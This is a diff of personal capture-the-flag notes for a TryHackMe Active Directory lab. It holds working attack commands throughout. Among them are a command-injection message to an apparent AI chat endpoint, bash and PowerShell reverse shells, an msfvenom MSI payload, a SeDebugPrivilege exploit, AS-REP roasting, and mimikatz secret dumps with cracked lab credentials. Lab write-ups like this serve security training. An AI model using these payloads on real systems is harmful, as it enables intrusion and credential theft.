@@ -6,10 +6,6 @@
 https://tryhackme.com/room/ho-aoc2025-yboMoPbnEX
 --------------------------------------
 
-//Add and delete for getting back to mark.
-sudo ip route add 10.200.171.101/32 dev ligolo
-sudo ip route add 10.200.171.122/32 dev ligolo 
-
 // Introduction
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 ## Storyline
@@ -167,7 +163,7 @@ python3 -m http.server 8000
 //T2
 curl -s -X POST http://10.200.171.10/api/chat \
   -H "Content-Type: application/json" \
-  -d '{"message": "SOC_ADMIN_EXECUTE_COMMAND:curl http://10.249.1.2:8000/$(id|base64 -w0)"}' | python3 -m json.tool
+  -d '{"message": "SOC_ADMIN_EXECUTE_COMMAND:curl http://10.249.1.3:8000/$(id|base64 -w0)"}' | python3 -m json.tool
 
 
 10.200.171.10 - - [19/Mar/2026 16:29:21] "GET /dWlkPTEwMDEod2ViKSBnaWQ9MTAwMSh3ZWIpIGdyb3Vwcz0xMDAxKHdlYikK HTTP/1.1" 404 -
@@ -187,15 +183,16 @@ uid=1001(web) gid=1001(web) groups=1001(web)
 sudo rlwrap -cAr nc -lvnp 443
 
 //T2
-echo -n 'bash -i >& /dev/tcp/10.249.1.2/443 0>&1' | base64
-YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yNDkuMS4yLzQ0MyAwPiYx
+echo -n 'bash -i >& /dev/tcp/10.249.1.4/443 0>&1' | base64
+
+//YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yNDkuMS40LzQ0MyAwPiYx
 
 cat > payload.json << 'EOF'
-{"message": "SOC_ADMIN_EXECUTE_COMMAND:bash -c 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yNDkuMS4yLzQ0MyAwPiYx | base64 -d | bash'"}
+{"message": "SOC_ADMIN_EXECUTE_COMMAND:bash -c 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4yNDkuMS40LzQ0MyAwPiYx | base64 -d | bash'"}
 EOF
 
-//NOTE: **iWhat this does:** sends a base64-encoded bash reverse shell to avoid special character issues in JSON. The target decodes it and runs:
-bash -i >& /dev/tcp/10.249.1.2/443 0>&1
+//NOTE: **What this does:** sends a base64-encoded bash reverse shell to avoid special character issues in JSON. The target decodes it and runs:
+bash -i >& /dev/tcp/10.249.1.4/443 0>&1
 
 2026-03-19 16:48:51 EDT -- 
 curl -s -X POST http://10.200.171.10/api/chat \
@@ -627,45 +624,22 @@ anne.clark@ai.vanchat.loc
 //The web application seems to allow arbitrary IP input for directory services.
 //Lets attempted to intercept LDAP authentication traffic.
 
+//Ligolo
+listener_add --addr 0.0.0.0:1111 --to 127.0.0.1:1111
+
 //Test Site
-nc -lnvp 1111 //Set-up listener on db
+nc -lnvp 1111 //Set-up listener on localBox
 
-DC Hostname / IP / LDAP Port
-10.200.171.11 / 1111
+//WebSite entries
+DC Hostname / IP 	LDAP Port
+10.200.171.11		1111
 
-//It connects back to DB
+//It connects back to localBox
 anne.clark@ai.vanchat.locWbqs8193
 
 //Possible Creds
 anne.clark@ai.vanchat.loc
 Wbqs8193
->>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-
-
-//Based on the WebSite http://10.200.171.101/ .122 might be a DomainControler.
-
-sudo ip route add 10.200.171.122/32 dev ligolo
-
-//Scan
-<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
-sudo nmap -Pn -sV -sC -p- 10.200.171.122 -oN DC.nmap
-
-PORT    STATE SERVICE      VERSION
-53/tcp  open  domain       Simple DNS Plus
-88/tcp  open  kerberos-sec Microsoft Windows Kerberos (server time: 2026-03-21 02:52:25Z)
-389/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: vanchat.loc, Site: Default-First-Site-Name)
-|_ssl-date: 2026-03-21T02:52:40+00:00; +1s from scanner time.
-| ssl-cert: Subject: commonName=DC1.ai.vanchat.loc
-| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC1.ai.vanchat.loc
-| Not valid before: 2025-10-31T04:19:27
-|_Not valid after:  2026-10-31T04:19:27
-636/tcp open  ssl/ldap     Microsoft Windows Active Directory LDAP (Domain: vanchat.loc, Site: Default-First-Site-Name)
-|_ssl-date: 2026-03-21T02:52:40+00:00; +1s from scanner time.
-| ssl-cert: Subject: commonName=DC1.ai.vanchat.loc
-| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC1.ai.vanchat.loc
-| Not valid before: 2025-10-31T04:19:27
-|_Not valid after:  2026-10-31T04:19:27
-Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
@@ -676,9 +650,9 @@ Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows
 // Account validation
 nxc ldap 10.200.171.122 -d ai.vanchat.loc -u anne.clark -p Wbqs8193
 
+nxc ldap 10.200.171.122 -d ai.vanchat.loc -u anne.clark -p Wbqs8193
 LDAP        10.200.171.122  389    DC1              [*] Windows 10 / Server 2019 Build 17763 (name:DC1) (domain:ai.vanchat.loc) (signing:None) (channel binding:Never)
 LDAP        10.200.171.122  389    DC1              [+] ai.vanchat.loc\anne.clark:Wbqs8193
-
 //Creds Work!
 
 // Domain Enumeration
@@ -690,36 +664,77 @@ nxc ldap 10.200.171.122 -d ai.vanchat.loc -u anne.clark -p Wbqs8193 --users | te
 wc -l users.txt
 556 users.txt
 
-//AS‑REP Roasting
+//AS-REP Roasting
 //Lets now do an AS‑REP roasting attack to identify accounts that do not require Kerberos pre‑authentication
 
-nxc ldap 10.200.171.122 -d ai.vanchat.loc -u anne.clark -p Wbqs8193 --asreproast asreproast.hash
+nxc ldap 10.200.171.122 -d ai.vanchat.loc -u anne.clark -p Wbqs8193 --asreproast ASREProastables.hash
 
 //This yielded 33 AS‑REP hashes, lets get to some offline cracking.
 
-2026-03-21 19:16:19 EDT -- 
+2026-04-05 02:35:30 EDT -- 
 #Crack Hash
-hashcat -m 18200 asreproast.hash /usr/share/wordlists/rockyou.txt
+hashcat -a0 -m 18200 ASREProastables.hash /usr/share/wordlists/rockyou.txt -O
 
-hashcat --show asreproast.hash
+hashcat --show ASREProastables.hash
 
-$krb5asrep$23$qw2.amy.young@AI.VANCHAT.LOC:0a285adc5274265cf83fd60968bb564c$a3cd90384c0b95180b21c04ec7bcd754e50fde605956fc1709e04e37a7d3d41b8312cd42850f3ab4358b53afca62dafd8d9bdf582c6c826b51261d199740183285db30f860ed1e568ea99b48ae60f89e197677a7e8f839fb18b304c6aea48931ff7fcf94a3c0c8cf86fc6ba8007303caf7846ca8ac08f4a20a36df619b427ed4548883484dcf5283f47ddc9ccc2007ac2adb5f7e18c8465b15a1837e53047e558bffc52b1404fe22b0fe6e3447ce0ccc854b45c9321ff1bd4b8b79717a807daf2830b1aa873f73574bed2753ff96706f528ef9b8f721a64756e084d698d79f5e6e151ed68debba59356cffca610d030a:password1!
+$krb5asrep$23$qw2.amy.young@AI.VANCHAT.LOC:4aea47028b029dea3ebd34c6609dda7a$f67bce4f7cf96575e99319a0a887a80d0c5b77a03bd81e0026bc976c844f075230c3298d866bb3f00cbbb697ef028d67bcf6f1b18125c6dcc747a99173225be117fa09187b52412fc7571bbbb76066ecae663ba47cce01bc35a78c5abcc5dfebb9026572a41cdbc519a34566b5203d9c2e89734fdedeb2d430b54548d332439179a2edeb8417efed32ef7423a0353de0d6c394f447b71758029e2ebc8123d157c73540ed6b5115014610afa60db386c3d0f37755e356de3dc7c9b5f52e41eb6b9a5c76358c7a771825e193d3ba41ae8963bde514929643f993dec84843b49e70be61f09ec588b913f3b44956e6b37f18:password1!
 
 //qw2.amy.young@AI.VANCHAT.LOC:password1!
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
-//RDP
-xfreerdp3 /sec:nla /cert:ignore /v:10.200.171.101:3389 /d:ai.vanchat.loc /u:qw2.amy.young /p:'password1!' /drive:Public,. /client-hostname:HAX /clipboard /audio-mode:2 /themes /wallpaper
-
-//Success!!!
+//RDP with Remmina
 
 
 // Initial
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
-whoami
-ai\qw2.amy.young
+whoami /all
+
+USER INFORMATION
+----------------
+
+User Name        SID
+================ ============================================
+ai\qw2.amy.young S-1-5-21-2486023134-1966250817-35160293-1496
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                          Attributes     
+========================================== ================ ============================================ ==================================================
+Everyone                                   Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14                                     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
+LOCAL                                      Well-known group S-1-2-0                                      Mandatory group, Enabled by default, Enabled group
+AI\Level 2 Operator                        Group            S-1-5-21-2486023134-1966250817-35160293-1113 Mandatory group, Enabled by default, Enabled group
+Authentication authority asserted identity Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                                                 
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== ========
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+Kerberos support for Dynamic Access Control on this device has been disabled.
+
+####
 
 whoami /priv
 
@@ -731,33 +746,22 @@ Privilege Name                Description                    State
 SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
 
-net user qw2.amy.young /domain
-The request will be processed at a domain controller for domain ai.vanchat.loc.
+####
 
-User name                    qw2.amy.young
-Full Name                    Amy Young
-Comment
-User's comment
-Country/region code          000 (System Default)
-Account active               Yes
-Account expires              Never
+PS C:\Users> ls
 
-Password last set            11/2/2025 6:10:18 PM
-Password expires             Never
-Password changeable          11/3/2025 6:10:18 PM
-Password required            Yes
-User may change password     Yes
 
-Workstations allowed         All
-Logon script
-User profile
-Home directory
-Last logon                   3/21/2026 4:43:55 AM
+    Directory: C:\Users
 
-Logon hours allowed          All
 
-Local Group Memberships
-Global Group memberships     *Level 2 Operator     *Domain Users
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+d-----        12/2/2025  10:31 AM                Administrator
+d-----       10/31/2025   8:29 PM                Administrator.AI
+d-r---        3/28/2026  12:57 PM                Public
+d-----        11/2/2025  12:02 PM                qw1.brian.singh
+d-----        3/28/2026   6:40 AM                qw2.amy.young
+d-----         9/7/2022   3:55 PM                THMSetup
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
@@ -771,7 +775,6 @@ type C:\user.txt
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 cp /usr/share/peass/winpeas/winPEASx64_ofs.exe .
 
-2026-03-21 16:18:06 EDT -- 
 .\winPEASx64_ofs.exe -lolbas log=winPeas.out
 
 //NOTE:To follow on kali use: tail -f winPeas.out
@@ -809,18 +812,25 @@ reg query HKCU\Software\Policies\Microsoft\Windows\Installer
 HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
     AlwaysInstallElevated    REG_DWORD    0x1
 
+//Listener (We still have this set in Ligolo)
+	0.0.0.0:1111 │ 127.0.0.1:1111 for 10.200.171.11
+
 //Create MSI file
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.200.171.11 LPORT=1111 -a x64 --platform Windows -f msi -o shell.msi
-
-//db(Listener)
-nc -lvnp 1111
 
 //Copy the MSI to the windows (It will NOT work from the rdp sharedrive)
 //I just copied it to the desktop to make this eaiser
 // C:\Users\<username>\AppData\Local\Temp or %TEMP% is better Opsec
 
-2026-03-21 17:54:01 EDT -- 
-Click the shell.msi icon for callback to db
+//New type of listener(Penelope)
+//git clone https://github.com/brightio/penelope.git
+cd penelope
+
+//Start Listener on localBox
+python3 penelope.py -p 1111
+
+2026-04-05 03:55:31 EDT -- 
+//Click shell.msi file on the machine. (Got callback!)
 
 whoami
 nt authority\system
@@ -848,6 +858,7 @@ cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
 
 cd C:\Users\qw2.amy.young\Desktop\
 
+//Run
 .\mimikatz.exe
 
 //Elevated token to ensure full SYSTEM impersonation
@@ -883,8 +894,30 @@ Credential : _4v41yVd$!DW
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
->>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
+#############################
+// This is after getting system on Server2, we will work from Server1 to make it just a little easier. Either server could work though.
+##############################
+
+//Connect back as SYSTEM from Server1
+//Check if listener is still up
+listener_list
+
+//NOTE: If not listed, make sure you are in the db session and run
+listener_add --addr 10.200.171.11:1111 --to 0.0.0.0:1111
+
+//Start localbox listener
+cd ~/haxterm/data/SideQuest0/2-server1/penelope/
+python3 penelope.py -p 1111
+
+2026-04-09 03:06:14 EDT -- 
+//Start Callback by clicking the shell.msi on the Desktop
+
+//SUCCESS!!!
+
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
 |================================================================
@@ -894,10 +927,12 @@ Credential : _4v41yVd$!DW
 		10.0.17763 N/A Build 17763 
 
 //CREDS:
-	KeyPass_Master: password
-	Server 2 Admin:                                        
-    	Username: adm
-    	Password: 8XX8N5VBFprFfmFSdQ4soUM4
+	qw1.brian.singh@AI.VANCHAT.LOC	: _4v41yVd$!DW
+	QW0.HANNAH.HARDY@AI.VANCHAT.LOC : Pwned123!
+		KeyPass_Master: password
+			Server 2 Admin:                                        
+    		Username: adm
+    		Password: 8XX8N5VBFprFfmFSdQ4soUM4
 
 //Flags:
 #User:		THM{d626aea9-d1ab-4f77-b668-90f221e3dbb6}
@@ -937,49 +972,261 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 //RDP with Brian Singh into Server2
-xfreerdp3 /sec:nla /cert:ignore /v:10.200.171.102:3389 /d:ai.vanchat.loc /u:qw1.brian.singh /p:'_4v41yVd$!DW' /drive:Public,. /client-hostname:HAX /clipboard /audio-mode:2 /themes /wallpaper
 
-//SUCCESS!!
+// Intial
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+PS C:\Users\qw1.brian.singh> whoami
+ai\qw1.brian.singh
+PS C:\Users\qw1.brian.singh> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== ========
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 #User flag
 type C:\user.txt
 //THM{d626aea9-d1ab-4f77-b668-90f221e3dbb6}
 
-
-// WinPeas
+// Shell as NT AUTHORITY SYSTEM
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
-cp /usr/share/peass/winpeas/winPEASx64_ofs.exe .
+PS C:\Users\qw1.brian.singh> whoami /groups
 
-2026-03-25 21:30:57 EDT -- 
-.\winPEASx64_ofs.exe -lolbas log=winPeas.out
+GROUP INFORMATION
+-----------------
 
-//NOTE:To follow on kali use: tail -f winPeas.out
+Group Name                                 Type             SID                                          Attributes     
+========================================== ================ ============================================ ===============================================================
+Everyone                                   Well-known group S-1-1-0                                      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Administrators                     Alias            S-1-5-32-544                                 Group used for deny only
+NT AUTHORITY\REMOTE INTERACTIVE LOGON      Well-known group S-1-5-14                                     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                     Mandatory group, Enabled by default, Enabled group
+LOCAL                                      Well-known group S-1-2-0                                      Mandatory group, Enabled by default, Enabled group
+AI\Level 1 Custodian                       Group            S-1-5-21-2486023134-1966250817-35160293-1114 Mandatory group, Enabled by default, Enabled group
+AI\Domain Admins                           Group            S-1-5-21-2486023134-1966250817-35160293-512  Group used for deny only
+Authentication authority asserted identity Well-known group S-1-18-1                                     Mandatory group, Enabled by default, Enabled group
+AI\Denied RODC Password Replication Group  Alias            S-1-5-21-2486023134-1966250817-35160293-572  Mandatory group, Enabled by default, Enabled group, Local Group
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
 
-//Loot
+//Admin Powershell
+PS C:\Windows\system32> whoami
+ai\qw1.brian.singh
+PS C:\Windows\system32> whoami /priv
 
-+ Critical Findings
-1. GenericAll over 129+ AD Objects (Domain Domination)
-Your user (via the "Level 1 Custodian" group) has GenericAll over virtually the entire domain: Domain Admins group, the Administrator user, DC1$ computer, the Domain Root, Domain Controllers OU, Account Operators, Backup Operators, and most regular users. This means you can reset Domain Admin's password or add yourself to Domain Admins right now using something like PowerView or Set-DomainUserPassword. This is effectively full domain compromise waiting to happen.
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== ========
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
 
 
-//qw1.lucy.fry has an account on this computer, lets try and change her password to get more info
-$Password = ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force
-$Creds = New-Object System.Management.Automation.PSCredential('AI\qw1.lucy.fry', $Password)
-Enter-PSSession -ComputerName localhost -Credential $Creds
+//SeDebugPrivilege is enabled
+SeDebugPrivilege allows privilege escalation since it lets a process open any other process with powerful permissions, including SYSTEM processes, bypassing normal access control checks enforced by the kernel. Once we can obtain a handle to a privileged process like winlogon.exe, we can inject code, duplicate tokens, or spawn child processes that inherit higher privileges. There is already an exploit for this that we are using:
 
-[localhost]: PS C:\Users\qw1.lucy.fry> whoami
-ai\qw1.lucy.fry
+//Download
+wget https://github.com/bruno-1337/SeDebugPrivilege-Exploit/releases/download/v1.0/SeDebugPrivesc.exe -O SeDebugPrivesc.exe
 
-//Success!!(Logged in as Lucy)
-//Going to migrate into a RDP session to keep in clean.
+//Copy SeDebugPrivesc.exe to remote machine.
+
+//Confirm/Create ligolo db listener
+listener_list
+
+
+2 │ xGh05t@db - 10.200.171.11:42798 - 0a0f306d39b7 │ tcp     │ 10.200.171.11:2222     │ 0.0.0.0:2222           │ Online
+
+//NOTE: If you have to create a db listener
+listener_add --addr 0.0.0.0:2222 --to 127.0.0.1:2222
+
+//Start LocalBox Listener
+python3 penelope.py -p 2222
+
+//Find a process to inject into
+I chose the spoolsv with PID 2420. Lets test the exploit...
+
+.\SeDebugPrivesc.exe -h
+Usage: C:\Users\qw1.brian.singh\Desktop\SeDebugPrivesc.exe <PID> <Program and Arguments>
+
+//Callback
+.\SeDebugPrivesc.exe 2420 "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMgAwADAALgAxADcAMQAuADEAMQAiACwAMgAyADIAMgApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=" 
+
+//My Base64 Code:
+$client = New-Object System.Net.Sockets.TCPClient("10.200.171.11",2222);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+//Success!! Got callback
+
+whoami
+nt authority\system
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
+#Admin flag
+cat C:\Users\Administrator\root.txt
+//THM{496fde67-1d0d-4776-833d-b6371f290eac}
+
+
+// Bloodhound Enumeration
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+//Run through the Neo4j and Bloodhound first time set-up
+
+locate SharpHound.exe
+/usr/share/sharphound/SharpHound.exe
+
+//Copy SharpHound.exe via ShareDrive
+
+//Use SYSTEM CB penelope shell to run SharpHound
+
+2026-04-06 01:37:17 EDT -- 
+.\SharpHound.exe -c ALL
+
+//Copy over the zip file(AI_Vanchat_loc_BloodHound.zip) through the share.
+
+//Upload AI_Vanchat_loc_BloodHound.zip to the BloodHound website.
+
+I ingested the data into BloodHound and via the preset query "Shortest paths to Domain Admins" I can see, that the machine "SERVER2" has "GenericAll" permission over the "Domain Admins group".
+
+Furthermore we have "GenericAll" persmission on multiple users. So we can change the password of one of those users and add them to the Domain Admins group.
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// Access as SERVER2$
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+In order to authenticate ourselves as SERVER2, I need at least the hash. Fortunately, since I am NT Authority System, I can easily obtain this via extraction of the LSA secrets including service account credentials and cached domain credentials using Mimikatz.
+
+//Use the Penelope shell (C:\Users\qw1.brian.singh\Desktop)
+//NOTE: Penelope shell can't do interactive shells so I have to run mimikatz in run command
+
+.\mimikatz.exe """token::elevate""" """lsadump::secrets""" """exit"""
+
+//NOTE: The triple quotes handle the argument parsing correctly through PowerShell's string handling.
+
+PS C:\Users\qw1.brian.singh\Desktop> .\mimikatz.exe """token::elevate""" """lsadump::secrets""" """exit"""
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz(commandline) # token::elevate
+Token Id  : 0
+User name : 
+SID name  : NT AUTHORITY\SYSTEM
+
+496     {0;000003e7} 1 D 16457          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
+ -> Impersonated !
+ * Process Token : {0;000003e7} 2 D 728631      NT AUTHORITY\SYSTEM     S-1-5-18        (11g,05p)       Primary
+ * Thread Token  : {0;000003e7} 1 D 759315      NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
+
+mimikatz(commandline) # lsadump::secrets
+Domain : SERVER2
+SysKey : cb72962d529be871f1f42128edbabcec
+
+Local name : SERVER2 ( S-1-5-21-696215726-3453771242-1174301429 )
+Domain name : AI ( S-1-5-21-2486023134-1966250817-35160293 )
+Domain FQDN : ai.vanchat.loc
+
+Policy subsystem is : 1.18
+LSA Key(s) : 1, default {cec270a6-8e02-ef52-9a42-30c3f33c9ea6}
+  [00] {cec270a6-8e02-ef52-9a42-30c3f33c9ea6} eb9d6b3d82e46add817fd2fbf30877336a5a6d844090126997430e4b7d7102e2
+
+Secret  : $MACHINE.ACC
+cur/hex : 37 4d 8a 0f f5 99 74 4c 2f 7f 31 8d e4 7d 95 bb b8 60 ea 08 9e 0a d5 13 1f e5 73 79 25 91 c7 17 85 1d 83 95 bc 6c 33 b7 10 13 b1 d1 f6 6e 46 97 66 80 08 f5 7b a2 9a 5a 43 a6 c2 35 dc d6 1f f6 ed 00 2f e5 16 ea 38 c2 b9 0a 9e 12 cf 0d 09 d9 77 52 41 d5 29 46 10 3c b7 cb 7c 2b 18 e1 49 d6 4f a8 4c 2a 47 4b 74 f3 11 96 d2 1b da e3 fd ce 88 a9 f5 5a 4c 96 d3 0a 61 97 77 f4 9c 10 af 13 43 a9 7f 84 dd 8f 2f 8d f8 6f 82 40 64 00 b7 df f7 46 e1 e2 8b 4d 12 32 db 83 0a 07 5f c5 f1 58 d6 7d 45 61 08 e9 a7 29 19 bf b9 2b e1 0b b0 5c b3 a9 e4 fd 5c 54 bf d9 1b d0 e1 2a 09 48 70 fb 6e 0c 31 73 f4 9d bf bc e6 a8 91 80 d9 f5 25 a8 e1 e6 30 71 61 de ff 89 c6 87 1f 1a 8b 2b 5c c9 1c 95 70 50 50 98 92 7c fb d2 26 95 58 af 8a e6 
+    NTLM:fc04ffd9bd842c6189411efe21afc9a0
+    SHA1:aca33fa541b14d1ee74d4916c416e7c141e0a94e
+old/text: Cs4$6> C@?R]B'H@Ytol`;5:MY$U18n*`KBAm9)uo0?G]@lxVFj5Xoeokb9H ZrEmfdzUC=CT W/.)d"Eh<fP3n#7dsJdGE0EhGR!V4wkqMkA"A@8+jUmdqr
+    NTLM:5db4556f585de86466f67db5f096f4ca
+    SHA1:46cfedd0d9a7902085f3fa266d01bfbb0fce2e97
+
+Secret  : DefaultPassword
+
+Secret  : DPAPI_SYSTEM
+cur/hex : 01 00 00 00 4a 67 da 3b cd b0 91 c0 56 9c b2 aa c9 7a 5b 78 8e d9 6a b9 6f 76 28 68 9f bf 7c 7f 7b c7 c2 98 ea e7 be ab fd 0d 96 a3 
+    full: 4a67da3bcdb091c0569cb2aac97a5b788ed96ab96f7628689fbf7c7f7bc7c298eae7beabfd0d96a3
+    m/u : 4a67da3bcdb091c0569cb2aac97a5b788ed96ab9 / 6f7628689fbf7c7f7bc7c298eae7beabfd0d96a3
+old/hex : 01 00 00 00 7f a1 21 14 36 83 ce 59 d7 37 25 4e 78 95 6d dc 92 95 2d e1 22 1e ed f9 11 ba 1f 49 6c bf a1 f6 32 ad fc 23 72 ca 6c c0 
+    full: 7fa121143683ce59d737254e78956ddc92952de1221eedf911ba1f496cbfa1f632adfc2372ca6cc0
